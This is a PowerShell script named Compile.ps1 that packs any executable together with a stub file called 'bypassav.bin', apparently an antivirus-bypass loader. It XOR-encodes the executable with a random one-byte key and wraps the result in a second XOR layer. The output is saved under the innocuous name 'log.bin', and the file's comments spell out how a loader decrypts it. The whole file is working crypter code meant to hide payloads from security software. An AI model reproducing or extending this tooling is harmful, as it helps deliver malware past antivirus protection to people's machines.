# Compile.ps1 - Compile engine: packs bypassav.bin + XOR'd exe, then encrypts with outer key.
# Usage: .\Compile.ps1 -ExePath "C:\path\to\file.exe" [-OutputPath "output.bin"]
# Inner layout (log.bin): [ bypassav.bin ][ key1 ][ 4 bytes exe size LE ][ exe XOR key1 ]
# Final output: [ 1 random byte key2 ][ log.bin encrypted with key2 ] (decrypt: buf[i]=buf[i] XOR buf[0] for i>=1)

param(
    [Parameter(Mandatory = $true)]
    [string]$ExePath,
    [string]$OutputPath = ""
)

$ErrorActionPreference = "Stop"
$scriptDir = $PSScriptRoot

# Resolve paths
$exeFullPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($ExePath)
if (-not (Test-Path -LiteralPath $exeFullPath)) {
    Write-Error "Exe not found: $exeFullPath"
    exit 1
}

$bypassPath = Join-Path $scriptDir "bypassav.bin"
if (-not (Test-Path -LiteralPath $bypassPath)) {
    Write-Error "bypassav.bin not found: $bypassPath"
    exit 1
}

if ([string]::IsNullOrEmpty($OutputPath)) {
    $OutputPath = Join-Path $scriptDir "log.bin"
}
$outFullPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputPath)

# 1) Load exe into memory
$exeBytes = [System.IO.File]::ReadAllBytes($exeFullPath)
$exeSize = $exeBytes.Length

# 2) Load bypassav.bin into memory
$bypassBytes = [System.IO.File]::ReadAllBytes($bypassPath)

# 3) Generate one random byte (XOR key)
$key = Get-Random -Minimum 0 -Maximum 256
$keyByte = [byte]$key

# 4) Build output binary
$ms = New-Object System.IO.MemoryStream

# Write bypassav.bin first
$ms.Write($bypassBytes, 0, $bypassBytes.Length)

# Write 1 random byte
$ms.WriteByte($keyByte)

# Write exe size as 4 bytes little-endian (e.g. 0x2B2000 -> 00 B2 02 00)
$sizeLe = [BitConverter]::GetBytes([uint32]$exeSize)
$ms.Write($sizeLe, 0, 4)

# XOR whole exe with the 1-byte key, then write
foreach ($b in $exeBytes) {
    $ms.WriteByte($b -bxor $keyByte)
}

$logBinBytes = $ms.ToArray()
$ms.Dispose()

# 4b) Write test.bin (inner layout, unencrypted): [ bypassav.bin ][ key1 ][ 4 bytes exe size LE ][ exe XOR key1 ]
$testBinPath = Join-Path $scriptDir "test.bin"
[System.IO.File]::WriteAllBytes($testBinPath, $logBinBytes)
Write-Host "test.bin (inner): $testBinPath ($($logBinBytes.Length) bytes)"

# 5) Encrypt log.bin with a second random byte (loader decrypts with: buf[i]=buf[i] XOR buf[0] for i>=1)
$key2 = [byte](Get-Random -Minimum 0 -Maximum 256)
$finalMs = New-Object System.IO.MemoryStream
$finalMs.WriteByte($key2)
foreach ($b in $logBinBytes) {
    $finalMs.WriteByte($b -bxor $key2)
}
$finalBytes = $finalMs.ToArray()
$finalMs.Dispose()

# 6) Write final binary
[System.IO.File]::WriteAllBytes($outFullPath, $finalBytes)

Write-Host "Compiled: $outFullPath"
Write-Host "  bypassav.bin: $($bypassBytes.Length) bytes"
Write-Host "  inner key (exe XOR): 0x$($keyByte.ToString('X2'))"
Write-Host "  outer key (log.bin encrypt): 0x$($key2.ToString('X2'))"
Write-Host "  exe size: $exeSize (0x$($exeSize.ToString('X')))"
Write-Host "  log.bin size: $($logBinBytes.Length) bytes"
Write-Host "  total (encrypted): $($finalBytes.Length) bytes"
